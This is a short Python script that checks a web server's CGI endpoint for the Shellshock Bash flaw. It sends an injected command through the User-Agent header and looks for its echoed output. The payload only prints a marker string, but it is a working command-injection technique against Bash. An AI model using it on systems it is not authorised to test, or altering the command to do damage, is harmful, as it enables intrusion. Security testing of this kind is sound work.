# http_shellshock.py
# description: checks for Bash Specially-crafted Environment Variables Code Injection Vulnerability
# reference: http://www.exploit-db.com/exploits/34766/
# author: @shipcod3

import sys, urllib, urllib2

def usage():
    print "\n Usage: python http_shellshock.py http://localhost/cgi-bin/batibot"

def main(argv):
    if len(argv) < 2:
        return usage()

    url = sys.argv[1]
    payload = "() { :;}; echo 'shellshocked!'"

    req = urllib2.Request(url)
    req.add_header('User-Agent', payload)

    try:
        response = urllib2.urlopen(req, timeout=60)
        data = response.read()
        if 'shellshocked' in data:
            print '[-] Vulnerable to Shellshock!'
        else:
            print '[-] Not Vulnerable!'
    except Exception as e:
        print "[+] Not Vulnerable!"

if __name__ == "__main__":
    main(sys.argv)
